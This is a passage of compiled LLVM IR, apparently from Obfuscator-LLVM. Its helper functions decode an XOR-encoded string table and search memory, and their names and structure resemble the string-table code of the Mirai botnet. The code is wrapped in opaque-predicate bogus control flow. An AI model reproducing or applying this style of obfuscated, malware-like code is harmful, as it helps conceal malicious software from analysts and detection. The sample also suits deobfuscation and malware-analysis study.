  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

; <label>:83:                                     ; preds = %34
  %84 = load i32, i32* @x.49
  %85 = load i32, i32* @y.50
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %83
  %92 = load i32, i32* %3, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %3, align 4
  %94 = load i32, i32* @x.49
  %95 = load i32, i32* @y.50
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:102:                                    ; preds = %27
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %83
  %103 = load i32, i32* %3, align 4
  %_ = shl i32 %103, 1
  %_1 = shl i32 %103, 1
  %_2 = shl i32 %103, 1
  %_3 = shl i32 %103, 1
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %33

; <label>:11:                                     ; preds = %2
  %12 = load i32, i32* @x.53
  %13 = load i32, i32* @y.54
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load %struct.table_value*, %struct.table_value** %5, align 8
  %21 = getelementptr inbounds %struct.table_value, %struct.table_value* %20, i32 0, i32 1
  %22 = load i16, i16* %21, align 8
  %23 = zext i16 %22 to i32
  %24 = load i32*, i32** %4, align 8
  store i32 %23, i32* %24, align 4
  %25 = load i32, i32* @x.53
  %26 = load i32, i32* @y.54
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %2
  %34 = load %struct.table_value*, %struct.table_value** %5, align 8
  %35 = getelementptr inbounds %struct.table_value, %struct.table_value* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  ret i8* %36

originalBBalteredBB:                              ; preds = %originalBB, %11
  %37 = load %struct.table_value*, %struct.table_value** %5, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 1
  %39 = load i16, i16* %38, align 8
  %40 = zext i16 %39 to i32
  %41 = load i32*, i32** %4, align 8
  store i32 %40, i32* %41, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.55
  %6 = load i32, i32* @y.56
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %14, align 8
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %17, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = load i32, i32* @x.55
  %24 = load i32, i32* @y.56
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %48

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* @x.55
  %33 = load i32, i32* @y.56
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  store i32 -1, i32* %13, align 4
  %40 = load i32, i32* @x.55
  %41 = load i32, i32* @y.56
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %162

; <label>:48:                                     ; preds = %originalBBpart2
  store i32 0, i32* %18, align 4
  br label %49

; <label>:49:                                     ; preds = %originalBBpart233, %48
  %50 = load i32, i32* @x.55
  %51 = load i32, i32* @y.56
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %49
  %58 = load i32, i32* %18, align 4
  %59 = load i32, i32* %15, align 4
  %60 = icmp slt i32 %58, %59
  %61 = load i32, i32* @x.55
  %62 = load i32, i32* @y.56
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %60, label %69, label %145

; <label>:69:                                     ; preds = %originalBBpart28
  %70 = load i8*, i8** %14, align 8
  %71 = load i32, i32* %18, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  %74 = load i8, i8* %73, align 1
  %75 = sext i8 %74 to i32
  %76 = load i8*, i8** %16, align 8
  %77 = load i32, i32* %19, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = icmp eq i32 %75, %81
  br i1 %82, label %83, label %108

; <label>:83:                                     ; preds = %69
  %84 = load i32, i32* %19, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %19, align 4
  %86 = load i32, i32* %17, align 4
  %87 = icmp eq i32 %85, %86
  br i1 %87, label %88, label %107

; <label>:88:                                     ; preds = %83
  %89 = load i32, i32* @x.55
  %90 = load i32, i32* @y.56
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %88
  %97 = load i32, i32* %18, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %13, align 4
  %99 = load i32, i32* @x.55
  %100 = load i32, i32* @y.56
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart216, label %originalBB10alteredBB

originalBBpart216:                                ; preds = %originalBB10
  br label %162

; <label>:107:                                    ; preds = %83
  br label %109

; <label>:108:                                    ; preds = %69
  store i32 0, i32* %19, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %107
  %110 = load i32, i32* @x.55
  %111 = load i32, i32* @y.56
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %109
  %118 = load i32, i32* @x.55
  %119 = load i32, i32* @y.56
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %126

; <label>:126:                                    ; preds = %originalBBpart220
  %127 = load i32, i32* @x.55
  %128 = load i32, i32* @y.56
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %126
  %135 = load i32, i32* %18, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %18, align 4
  %137 = load i32, i32* @x.55
  %138 = load i32, i32* @y.56
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart233, label %originalBB22alteredBB

originalBBpart233:                                ; preds = %originalBB22
  br label %49

; <label>:145:                                    ; preds = %originalBBpart28
  %146 = load i32, i32* @x.55
  %147 = load i32, i32* @y.56
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %145
  store i32 -1, i32* %13, align 4
  %154 = load i32, i32* @x.55
  %155 = load i32, i32* @y.56
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %162

; <label>:162:                                    ; preds = %originalBBpart237, %originalBBpart216, %originalBBpart24
  %163 = load i32, i32* @x.55
  %164 = load i32, i32* @y.56
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %162
  %171 = load i32, i32* %13, align 4
  %172 = load i32, i32* @x.55
  %173 = load i32, i32* @y.56
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  ret i32 %171

originalBBalteredBB:                              ; preds = %originalBB, %4
  %180 = alloca i32, align 4
  %181 = alloca i8*, align 8
  %182 = alloca i32, align 4
  %183 = alloca i8*, align 8
  %184 = alloca i32, align 4
  %185 = alloca i32, align 4
  %186 = alloca i32, align 4
  store i8* %0, i8** %181, align 8
  store i32 %1, i32* %182, align 4
  store i8* %2, i8** %183, align 8
  store i32 %3, i32* %184, align 4
  store i32 0, i32* %186, align 4
  %187 = load i32, i32* %184, align 4
  %188 = load i32, i32* %182, align 4
  %189 = icmp sgt i32 %187, %188
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  store i32 -1, i32* %13, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %49
  %190 = load i32, i32* %18, align 4
  %191 = load i32, i32* %15, align 4
  %192 = icmp slt i32 %190, %191
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %88
  %193 = load i32, i32* %18, align 4
  %_ = sub i32 %193, 1
  %gen = mul i32 %_, 1
  %_11 = sub i32 %193, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %193, 1
  %gen14 = mul i32 %_13, 1
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %13, align 4
  br label %originalBB10

originalBB18alteredBB:                            ; preds = %originalBB18, %109
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %126
  %195 = load i32, i32* %18, align 4
  %_23 = shl i32 %195, 1
  %_24 = sub i32 %195, 1
  %gen25 = mul i32 %_24, 1
  %_26 = sub i32 %195, 1
  %gen27 = mul i32 %_26, 1
  %_28 = sub i32 %195, 1
  %gen29 = mul i32 %_28, 1
  %_30 = sub i32 0, %195
  %gen31 = add i32 %_30, 1
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %18, align 4
  br label %originalBB22

originalBB35alteredBB:                            ; preds = %originalBB35, %145
  store i32 -1, i32* %13, align 4
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %162
  %197 = load i32, i32* %13, align 4
  br label %originalBB39
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846896}
!2 = !{i32 -2146846487}
